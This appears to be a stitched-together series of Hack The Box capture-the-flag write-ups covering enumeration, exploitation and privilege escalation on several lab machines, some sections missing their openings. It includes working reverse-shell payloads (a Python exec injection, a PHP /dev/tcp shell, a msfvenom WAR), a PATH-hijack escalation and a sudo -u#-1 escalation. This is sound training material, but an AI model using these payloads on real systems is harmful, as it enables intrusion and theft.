Improved ability: . | CVE Research | Source code review | $PATH based privilege escalation | . Used tools: . | nmap | searchsploit | pspy64 | . Introduction &amp; Foothold: . Let’s start with a common full nmap scan on the box: . $ nmap -A 10.10.10.138 . The only available ports are the port 22 (with OpenSSH 7.4p1) and the port 80, running Apache httpd 2.4.25. Because of this version of OpenSSH doesn’t have known vulnerability, let’s analyse the root and /writeup/ folder (contained into the robots.txt) with a web browser. Once inside the root, we will prompted with an old-school floppy-disk background and a tips saying that because the site was attacked, it has been implemented a DoS protection that potentially can block us from performing brute-force enumeration. Let’s move analyse the /writeup/ folder: . Here we can find some old writeups, but nothing very useful. However, looking at the source code, we are able to find the first important information: the CMS type. Now that we know our target use CMS Made Simple, we can search online for public exploit. Suddenly, though the usage of searchsploit we found the right script to compromise our target . $ searchsploit 'cms made simple' -------------------------------------------------------------------------------------------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------- CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit) | exploits/php/remote/46627.rb CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion | exploits/php/webapps/26217.html CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting | exploits/php/webapps/26298.txt CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting | exploits/php/webapps/29272.txt ... CMS Made Simple &lt; 2.2.10 - SQL Injection | exploits/php/webapps/46635.py . Gaining access as jkr . Analysing every record, notice how the SQL injection exploit (46635) is valid for every version under the 2.2.10. Download and execute the script! . $ searchsploi -m 46635 $ python 46635.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlist/rockyou.txt [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7 [+] Password cracked: raykayjay9 . Good! We have the user password. Now we can login into the box as jkr and proceeds to the privilege escalation phase. $ ssh jkr@10.10.10.138 $ cat /home/jkr/user.txt d4e493fd4068af... Privilege Escalation . After looking for a long time for passwords, misconfiguration or other forms of escalation, I decided to take a closer look to every process running on the machine, so I downloaded pspy and launched it. After a while, mine attention were caught by these few lines: . 2019/10/11 10:35:58 CMD: UID=0 PID=2279 | sshd: [accepted] 2019/10/11 10:35:58 CMD: UID=102 PID=2280 | sshd: [net] 2019/10/11 10:36:00 CMD: UID=0 PID=2281 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/10/11 10:36:00 CMD: UID=0 PID=2282 | run-parts --lsbsysinit /etc/update-motd.d 2019/10/11 10:36:00 CMD: UID=0 PID=2283 | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0 PID=2284 | /bin/sh /etc/update-motd.d/10-uname 2019/10/11 10:36:00 CMD: UID=0 PID=2285 | sshd: jkr [priv] . It seems that every time someone logs in, the /etc/update-motd.d/10-uname script is executed. The contents of the scripts are the following: . jkr@writeup:/etc/update-motd.d$ cat 10-uname #!/bin/sh uname -rnsom jkr@writeup:/etc/update-motd.d$ uname -rnsom Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux . It is clear the script execute a uname without using any kind of path, searching the right binary into the $PATH variable. In case we are able to write inside one of the directories contained in $PATH and before the script identifies the original uname binary, we can run arbitrary code as root and execute our escalation (that because the 10-uanme process run with UID=0, so it runs as root) . $PATH contains the following directories: . jkr@writeup:/home/jkr$ ls -l -d /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin drwxr-xr-x 2 root root 4096 Apr 19 04:24 /bin drwxr-xr-x 2 root root 4096 Apr 19 04:14 /sbin drwxr-xr-x 2 root root 20480 Apr 24 13:13 /usr/bin drwx-wsr-x 2 root staff 20480 Jul 10 17:27 /usr/local/bin drwx-wsr-x 2 root staff 12288 Jul 10 17:23 /usr/local/sbin drwxr-xr-x 2 root root 4096 Apr 19 07:31 /usr/sbin . two of which allow staff group users to write into them. Because jkr is part of the staff group, we are able to create a custom script named uname that will be executed in place of the original script once someone logs in. jkr@writeup:/etc/update-motd.d$ echo \"cat /root/root.txt\" &gt; /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ chmod +x /usr/local/sbin/uname jkr@writeup:/etc/update-motd.d$ exit root@0xbro:~/Documents/CTF/HTB/Writeup# ssh jkr@10.10.10.138 jkr@10.10.10.138 password: eeba47f60b48ef92...

We can notice the presence of four open ports: two web server on the numbers 80 and 1000 and a Redis daemon on the number 6379. Enumerating the two web services, we discovered that for this specific version of MiniServ multiple authenticated exploits exists… they could come in handy later. About Redis, we can enumerate the service through some NSE scripts, however without getting anything useful except the specific Linux box version (Linux 4.15.0-58-generic x86_64) . $ nmap --script redis-info -sV -p 6379 10.10.10.160 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 22:20 CET Nmap scan report for 10.10.10.160 Host is up (0.047s latency).

About Redis: . Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message broker. In order to works properly, the program needs a specific user, who can read and write on physical memory … in short, a 100% working user. Because of that, once we log into the service, we can read and write into the redis /home directory, and because we know that the user has a valid shell and a valid home, we can inject our personal SSH key in order to gain access through SSH without knowing the right password. First, I generated a new pair of SSH key with the ssh-keygen command, next, inside the redis home directory, I created the **/.ssh **dir and the authorized_keys file, inside of which I wrote my public SSH key. After those steps, finally I was able to login as redis user, without really know its password. Lateral movement to Matt .

Among the thousands of lines of information returned by the tool, we notice immediately that there is a publicly readable RSA-key’s backup file belonging to Matt, the user of the machine. Extrapolate and bring it on our local machine in order to try to crack it. In order to crack an SSH key, first we need to generate an hash from it. To achieve this tasks, we can use ssh2john. Next, after having generate the hash, we can crack it using john: . Gathered the password, try logging in via SSH with Matt user … but it does not work. Not a problem, because the same password is valid for switching to the Matt user with the su command. Privilege Escalation . The privilege escalation process can be achieved easily with Metasploit. During the enumeration phase we found an authenticated Remote Command Execution exploit fitting the targeted Webmin version: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_packageup_rce.md . This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges via the data parameter to update.cgi. So let’s load the module, compile the appropriate fields and execute the exploit. What we will get is a shell with root permissions . Trophy .

From the output above we can notice that there are only two services running on the box: OpenSSH on port 22 and a nostromo 1.9.6 running on the port 80. Taking a look to the web site we notice that it is made up only by static-pages. This reduce our attack surface. However, a rapid search online reveals that this particular web server version is vulnerable to an RCE vulnerability (CVE-2019-16278) and a public exploit exists (id 47837). All we have to do is download the exploit, create a listening server with netcat and get our reverse shell . Lateral movement to David . Now that we have a shell, we can take a look to which user the box has. We notice that the machine user is david. To speed up the post exploitation process, we can upload on our target LinEnum.sh and run it. The tools reveals that it found a password hash saved in the nostromo backup file /var/nostromo/conf/.htpasswd. We can try to crack it with hashcat while we perform some other recon. After few minutes hashcat reveals that the hashed password was Nowonly4me, however trying to use it around we find that it’s useless. Rabbit hole! . Browsing the configuration files of the web server some useful information come out from /var/nostromo/conf/nhttpd . From the configuration it seems that in /home directories may be present a public_www directory. Browsing the supposed folder not only we discover that it really exists, but also that inside it is contained an interesting folder called protected-file-area. Inside it we discovered a backup archive containing david SSH keys. Now we have to crack them so let’s create the hash of the private key with ssh2john and after we get it, let’s crack it with john: . Well done, we have found david’s SSH password. Now we can login via SSH and proceeds with the privesc phase. Privilege Escalation . Taking a look at the david’s home directory we noticed the bin folder, which contains two files inside, one of which is a script. We can see how the journalctl command is executed via sudo, and the result is then passed to the cat command to display it uniformly on the screen. I have searched far and wide for the web for a possible exploit for journalctl, but without finding anything. After a few hours of research, I landed on a page called GTFObins, where there was talks about different method to perform privilege escalation through the program in question and many others. Here is the link to the page: https://gtfobins.github.io/gtfobins/journalctl/. I quote what is said on the page: . … . This invokes the default pager, which is likely to be less, other functions may apply. In simple words: to display the output of the command on the screen, the journalctl program uses the less command by default (for this reason, in the script it was then redirected to the cat command). However, this command “has a defect”: once executed, it waits for a command from a user. In this situation, however, it is possible to escape from the less command. Since journalctl can be run with elevated privileges via the sudo command, using the feature of the less command it is possible to obtain a shell as root! . Now type :!/bin/bash and… . … obtain a root shell! . Trophy . Everything is a copy of a copy of a copy. - Chuck Palahniuk, Fight Club . License . Author: 0xbro .

The script handles client-server requests to the web server, but contains a vulnerability in the following code segment . path = urllib.parse.unquote(path) try: info = \"output = 'Document: {}'\" # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) . since an exec instruction is executed into info, that contains path, a variable that we can populate at will and which will be injected into the exec. Let’s build a script that allows us to exploit the vulnerability: . import requests import urllib import os target = 'http://10.10.10.168:8080/' expl = 'tmp\\''+'\\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.27\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])\\na=\\'' payload = urllib.parse.quote(expl) print(\"payload\") print(target + payload) r = requests.get(target+payload) print(r.headers) print(t.text) . This script will inject a reverse-shell to our IP, on port 9999, as the content of the variable passed to the exec statement will compose this payload: . exec (output = 'Document: tmp' import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect ((\"10.10.14.27\", 9999)); os.dup2 (s.fileno (), 0); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2); p = subprocess.call ([ \"/ bin / bash\", \"- i\"]) a = '') . Lateral movement to Robert . Once we got the shell as www-data, let’s do some post-exploitation recon to find out that the user of the machine is called Robert. Visiting his home directory we find out that we can read the contents of his files. Inside the home we find a series of scripts, including a custom SSH server (BetterSSH), a crypt-decrypt tool (SuperSecureCrypt.py) and a set of files to perform some tests. The code for SuperSecureCrypt.py is the following: . import sys import argparse def encrypt(text, key): keylen = len(key) keyPos = 0 encrypted = \"\" for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr + ord(keyChr)) % 255) encrypted += newChr keyPos += 1 keyPos = keyPos % keylen return encrypted def decrypt(text, key): keylen = len(key) keyPos = 0 decrypted = \"\" for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr - ord(keyChr)) % 255) decrypted += newChr keyPos += 1 keyPos = keyPos % keylen return decrypted parser = argparse.ArgumentParser(description='Encrypt with 0bscura\\'s encryption algorithm') parser.add_argument('-i', metavar='InFile', type=str, help='The file to read', required=False) parser.add_argument('-o', metavar='OutFile', type=str, help='Where to output the encrypted/decrypted file', required=False) parser.add_argument('-k', metavar='Key', type=str, help='Key to use', required=False) parser.add_argument('-d', action='store_true', help='Decrypt mode') args = parser.parse_args() banner = \"################################\\n\" banner+= \"# BEGINNING #\\n\" banner+= \"# SUPER SECURE ENCRYPTOR #\\n\" banner+= \"################################\\n\" banner += \" ############################\\n\" banner += \" # FILE MODE #\\n\" banner += \" ############################\" print(banner) if args.o == None or args.k == None or args.i == None: print(\"Missing args\") else: if args.d: print(\"Opening file {0}...\".format(args.i)) with open(args.i, 'r', encoding='UTF-8') as f: data = f.read() print(\"Decrypting...\") decrypted = decrypt(data, args.k) print(\"Writing to {0}...\".format(args.o)) with open(args.o, 'w', encoding='UTF-8') as f: f.write(decrypted) else: print(\"Opening file {0}...\".format(args.i)) with open(args.i, 'r', encoding='UTF-8') as f: data = f.read() print(\"Encrypting...\") encrypted = encrypt(data, args.k) print(\"Writing to {0}...\".format(args.o)) with open(args.o, 'w', encoding='UTF-8') as f: f.write(encrypted) . while the contents of check.txt, out.txt and passwordreminder.txt is . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# cat check.txt Encrypting this file with your key should result in out.txt, make sure your key is correct! . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd out.txt 00000000 c2 a6 c3 9a c3 88 c3 aa c3 9a c3 9e c3 98 c3 9b |................| 00000010 c3 9d c3 9d c2 89 c3 97 c3 90 c3 8a c3 9f c2 85 |................| 00000020 c3 9e c3 8a c3 9a c3 89 c2 92 c3 a6 c3 9f c3 9d |................| 00000030 c3 8b c2 88 c3 9a c3 9b c3 9a c3 aa c2 81 c3 99 |................| 00000040 c3 89 c3 ab c2 8f c3 a9 c3 91 c3 92 c3 9d c3 8d |................| 00000050 c3 90 c2 85 c3 aa c3 86 c3 a1 c3 99 c3 9e c3 a3 |................| 00000060 c2 96 c3 92 c3 91 c2 88 c3 90 c3 a1 c3 99 c2 a6 |................| 00000070 c3 95 c3 a6 c3 98 c2 9e c2 8f c3 a3 c3 8a c3 8e |................| 00000080 c3 8d c2 81 c3 9f c3 9a c3 aa c3 86 c2 8e c3 9d |................| 00000090 c3 a1 c3 a4 c3 a8 c2 89 c3 8e c3 8d c3 9a c2 8c |................| 000000a0 c3 8e c3 ab c2 81 c3 91 c3 93 c3 a4 c3 a1 c3 9b |................| 000000b0 c3 8c c3 97 c2 89 c2 81 76 |........v| 000000b9 . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd passwordreminder.txt 00000000 c2 b4 c3 91 c3 88 c3 8c c3 89 c3 a0 c3 99 c3 81 |................| 00000010 c3 91 c3 a9 c2 af c2 b7 c2 bf 6b |..........k| 0000001b . We need to find the secret key in order to be able to decrypt the passwordreminder.txt file and authenticate ourselves as robert. To do this, we need to analyse the encryption script and crack out.txt . Because out.txt and check.txt are “brothers” (they depend on each other), what we want to do is use the SuperSecureCrypt.py encryption mechanism to brute-force each character of the alphabet with each character inside check.txt, until get out.txt. To do this, we just need to build a quick python script . import string banner = \"################################\\n\" banner+= \"# BEGINNING #\\n\" banner+= \"# SUPER SECURE ENCRYPTOR #\\n\" banner+= \"################################\\n\" banner+= \"################################\\n\" banner+= \"# BRUTE FORCE MODE #\\n\" banner+= \"################################\" print(banner) key = \"\" with open('check.txt','r',encoding='UTF-8') as f: clearFile = f.read() with open('out.txt','r',encoding='UTF-8') as f: cryptedFile = f.read() indCrypt = 0 for cryptChr in cryptedFile: # ciclo ogni carattere criptato for incr in range(1,255): # provo ogni valore di chiave newChr = ord(cryptChr) newChr = chr((newChr - incr) % 255) if newChr == clearFile[indCrypt]: key += chr(incr) break # vado alla lettera criptata successiva indCrypt = indCrypt +1 # tengo il conto della posizione del carattere print(key) . Running our script, we will get the secret password, and through the password we will be able to decode passwordreminder.txt . Password found! Now we can use it via the command su to become Robert. Privilege Escalation . Like the rest of the machine, the privilege escalation path is also based on the exploitation of a custom component of the box. By running the sudo -l command we will notice how the user can run the BetterSSH.py script with root permissions. BetterSSH.py source is the following: . import sys import random, string import os import time import crypt import traceback import subprocess path = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) session = {\"user\": \"\", \"authenticated\": 0} try: session['user'] = input(\"Enter username: \") passW = input(\"Enter password: \") with open('/etc/shadow', 'r') as f: data = f.readlines() data = [(p.split(\":\") if \"$\" in p else None) for p in data] passwords = [] for x in data: if not x == None: passwords.append(x) passwordFile = '\\n'.join(['\\n'.join(p) for p in passwords]) with open('/tmp/SSH/'+path, 'w') as f: f.write(passwordFile) time.sleep(.1) salt = \"\" realPass = \"\" for p in passwords: if p[0] == session['user']: salt, realPass = p[1].split('$')[2:] break if salt == \"\": print(\"Invalid user\") os.remove('/tmp/SSH/'+path) sys.exit(0) salt = '$6$'+salt+'$' realPass = salt + realPass hash = crypt.crypt(passW, salt) if hash == realPass: print(\"Authed!\") session['authenticated'] = 1 else: print(\"Incorrect pass\") os.remove('/tmp/SSH/'+path) sys.exit(0) os.remove(os.path.join('/tmp/SSH/',path)) except Exception as e: traceback.print_exc() sys.exit(0) if session['authenticated'] == 1: while True: command = input(session['user'] + \"@Obscure$ \") cmd = ['sudo', '-u', session['user']] cmd.extend(command.split(\" \")) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) o,e = proc.communicate() print('Output: ' + o.decode('ascii')) print('Error: ' + e.decode('ascii')) if len(e.decode('ascii')) &gt; 0 else print('') . Here we can follow two methods to get root permissions: . | Intercept the file with /etc/shadow contents | Exploit the code vulnerability | . To save time, I decided to follow the first path. Since the script temporarily saves the contents of /etc/shadow within a randomly named file in /tmp/SSH, it is possible to intercept it and move it before the script removes it. To do this, we have to create the following mini-script: . #!/bin/bash while : do find \"/tmp/SSH\" -type f -exec mv {} /tmp/tmp \\; done . and run it, simultaneously execute BetterSSH.py with sudo. The program will return an error because it will not be able to delete the file that we have intercepted. On the other hand, by opening the intercepted file, we will be able to extract the hash of the root user to crack it with john. Once the password is obtained, we can use the su command to authenticate as root. Trophy . Notoriety wasn't as good as fame, but was heaps better than obscurity. - Neil Gaiman . License .

Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds . We can see that only two services are exposed: a non-vulnerable SSH version, and an Apache web server on port 80 with a default page. In order to enumerate all the possible sub-pages of the site and find an entry point, let’s start a Dirbuster scan. Among the first results of the tool execution we find these records: . / /index.php /icons/ /music/ /ona/ . Visiting each page, arrived at http://10.10.10.171/ona/ we realize that in front of us we have a vulnerable version of OpenNetAdmin, a web application for the network administration. Let’s use searchsploit to find out if there are exploits fitting this particular version… the 47772 seems to be what we need, a Command Injection on OpenNetAdmin 18.1.1. We just have to download it, import it into metasploit, set the correct parameters and run it. Lateral movement to Jimmy . Analyzing the contents of the /etc/passwd file we notice that the main users on the box are actually two: Jimmy and Joanna. After having take a look at the machine and launching LinEnum.sh without success, I decided to check better the processes of the machine via pspy64. By observing the various processes, one particular line attracts my attention: . 2020/02/14 22:35:20 CMD: UID=33 PID=7150 | sh -c php -l /opt/ona/www/local/config/database_settings.inc.php . I decide to analyze the contents of the database_settings.inc.php file: . &lt;?php $ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ), ); . We have a password! Let’s try using it to log in as jimmy… it works! . Lateral movement to Joanna . Now that we have a shell as jimmy, our goal is to become joanna, as this user will take us to the root. Since we have new privileges compared to before, we will be able to enumerate the machine in more depth, as for the /var/www/internal/folder, which seems to suggest the presence of a web page that can only be visited from inside the machine, so before we could not find it via dirbuster. The confirmation is obtained from the Apache configuration file, which tells us that on port 52846 there is a virtual host running as joanna, exposing the pages contained in /var/www/internal/. At this point, there are different ways to go over the obstacle: . | SSH Port Forwarding | local curl | Write a PHP shell in the /var/www/internal/ directory | . In this writeup we will deal with the port forwarding approach. I used the OpenAdmin box as an SSH tunnel on the Kali local port 12345, and through SwitchyOmega I used port 12345 as a proxy so that when I visited http://127.0.0.1/52864 I was actually visiting locally the OpenAdmin machine. In this way we can interact with the web application as if it was an exposed application. Having access to the /var/www/internal/folder, it was possible to review the sources contents in search of any vulnerabilities or bypass techniques. The index.php page, for example, to log in a user, checks the supplied input with a hard-coded hash: . &lt;?php $msg = ''; if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(\"Location: /main.php\"); } else { $msg = 'Wrong username or password.'; } } ?&gt; . It is therefore easy to bypass the control, either by deciding to crack the hash (which turns out to be a SHA512 containing the password Revealed), or, since we have access to the source in read/write, replacing the control with a control at will. Once the control is bypassed, we will find ourselves on the main.php page with Joanna’s private RSA certificate shown on the video. Let’s copy it into the joanna.txt file and give it to ss2john in order to generate a hash that can be cracked with john: . We have Joanna’s password! . Privilege Escalation . The Privilege Escalation process is the easiest and fastest I’ve ever seen. By running the sudo -l command we notice how the user joanna can open the /opt/priv file via the nano text editor as root user. We just have to run the command and, within nano, use the code execution feature to be able to run commands as root! . Trophy . It's never too late to start.&lt;br&gt; - Me, Myself and I . License .

Looking to the source code of the page, a comment comes out. Searching it on google, it reveals to be the description of a repo containing only web-shells. We can suppose that one of those shells is the one used in this machine. Assuming this, lets create a wordlist using the discovered shells’ name and fuzz the web page in order to find the correct one. Bingo! smevk.php is the web shell used on the box. Credentials can be found on the source code on github. Easily guessable, the combination is admin:admin . Once inside, we can easily submit commands to the box. In order to get a more stable and comfortable shell, I added my SSH key to the authorized_keys file, obtaining an SSH access as webadmin. Lateral Movement to sysadmin . Listing all the files within the webadmin home directory, we discovered the presence of Luvit, a . scripting platform just like node.

It requires good enumeration and a deep research during post exploitation. Let’s start as always with a nmap scan in order to find open ports and services: . root@kali:/HackTheBox/Machine/Blunder# nmap 10.10.10.191 -sV -sC -O -A --script=banner -oA nmap.txt PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Aggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (88%), Linux 3.1 (88%), Linux 3.2 (88%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (87%), OpenWrt White Russian 0.9 (Linux 2.4.30) (87%), Asus RT-AC66U router (Linux 2.6) (87%), Asus RT-N16 WAP (Linux 2.6) (87%), Asus RT-N66U WAP (Linux 2.6) (87%) No exact OS matches for host (test conditions non-ideal). The tool reveals that there is only a single port open on the box: the HTTP port 80, with an Apache httpd 2.4.41 web server over. Because we don’t have any useful information, we need to perform some manual recon browsing the site. Unfortunately visiting the site we found only few articles without useful stuff (for now :wink:). We need to enumerate other existing files and directories using gobuster in search of other useful information: . root@kali:/HackTheBox/Machine/Blunder# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x .html,.php,.txt,.old ... /about (Status: 200) /0 (Status: 200) /admin (Status: 301) /install.php (Status: 200) /robots.txt (Status: 200) /todo.txt (Status: 200) /usb (Status: 200) /LICENSE (Status: 200) . Gobuster found a bunch of elements, some of which very interesting: first of all the /admin directory (which present an authentication form whose we don’t know credentials), the /robots.txt (that in this case isn’t very helpful), the /install.php file and the /todo.txt file, containing the following text: . -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING . Good, it seems we have found a user called fergus. Moreover, reading the output of install.php, we discovered that Blunder is nothing else than a bludit installation. Now that we found the application name, we need to find the respective software version. To achieve this, we can visit the official bludit site and search within the documentation for the directory structure and where important files are. . Alright, we know that we are dealing with Bludit 3.9.2 and we also know the structure of the various directories and that the listing is enabled. All useful stuff but at the moment it seems that the only way to proceed is bypassing the login form. Let’s try standard / weak credentials with the fergus user, but without success. Trying to make brute force with standard wordlist instead we get a ban. Googling a bit I found this article about bypassing the Bludit Brute Force Mitigation, however no wordlist still works. Let’s try to create our personalized wordlist using cewl: . root@kali:/HackTheBox/Machine/Blunder# cewl -m 5 -w customList.txt http://10.10.10.191 CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) root@kali:/mnt/hgfs/ownCloud/Documents/CTF/HackTheBox/Machine/Blunder/files# tail customList.txt Blunder Pagination HackTheBox typically visited simple things contact small story . and execute again the article’s script, this time with our wordlist . Here we are, we got the password! We can proceed into the admin section. Searching online we find that there are several vulnerabilities for bludit, especially for this particular version, including an authenticated RCE that can be perfect for us as we already get the creds. The CVE-2019-16113 exploitation allows two different approaches: . | using the metasploit exploit | manual exploitation following this thread | . Since I am practicing for OSCP, I will follow the manual approach. As said in the github thread listed above, Bludit 3.9.2 present an RCE vulnerability in an authenticated site section, in detail the vulnerable function is the images upload. Due to some bad checks, it is possible to upload an image with some code injected into an arbitrary folder, uploading a .htaccess file and execute the code injected into the image. These are the detailed steps: . | Using Burp Suite we intercept and edit the image upload request in order to arbitrary change the path where the image will be saved (editing the uuid field) and injecting our php payload. Server response is a 200 OK, meaning that the file has been uploaded . | Using the Burp Suite repeater function we edit the previous request in order to upload an .htaccess file that allow the image’s injected code execution. Note: the server responds with an error message, however the file has been uploaded anyway . | Sending a GET request to the image, we are executing the code injected into. Because the payload was . &lt;?php file_put_contents(\"../../uploads/webShell.php\",\"&lt;?php exec(\\\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.28/1234 0&gt;&amp;1'\\\"); ?&gt; \"); ?&gt; . we are creating a php reverse shell. | Now that we have a php reverse shell on the server we just have to listen with netcat waiting for the connection and run the php file. | . Lateral Movement to Hugo . Now that we are into the box with a low-privileged shell, we need to find a way to move laterally to someone else with higher privileges. Let’s go hunting for hardcoded passwords into configuration files. The /bl-content/databases/ seems to be the right place, and in fact the /users.php file contains what we were looking for: a hashed password of a machine user. www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; { \"admin\": { \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"} } . The hash can be easily reverted using online tools like crackstation, and it turns out to be a sha1 hash of Password120 . Now we are able to switch to hugo! . Privilege Escalation . Privilege escalation can be reached through a rapid google research. Now that we are hugo we can check if he can run some sudo commands: . hugo@blunder:~$ sudo -V Sudo version 1.8.25p1 Sudoers policy plugin version 1.8.25p1 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.25p1 hugo@blunder:~$ sudo -l Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User hugo may run the following commands on blunder: (ALL, !root) /bin/bash . We notice that hugo can’t run /bin/bash as root. However, a rapid google research reveals that for sudo 1.8.28 or less exists a public exploit (47502) (CVE-2019-14287) that allow to perform privilege escalation executing commands as user #-1. … Sudo doesn’t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv . So … . hugo@blunder:~$ sudo -u#-1 /bin/bash root@blunder:/home/hugo# id uid=0(root) gid=1001(hugo) groups=1001(hugo) root@blunder:/home/hugo# . we are root! . Trophy . Persistence is very important.

Introduction &amp; Foothold . Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights. Let’s start as always with an nmap scan: . root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel . We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31). Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly . echo \"10.10.10.194    megahosting.it\" &gt;&gt; /etc/hosts . Now that we are effectively ready, let’s start enumerating every page of the first web server. After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI). Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods worked… so I decided to start to enumerate the second web server (tomcat), looking for another entry point. root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) . Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them. Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml . Good! Now we are able to login into the /manager directory and proceeds. Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation). Once we find the way, let’s create our reverse shell through msfconsole . root@kali:/var/www/html# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war . load it on the server . root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' -T maoutis.war 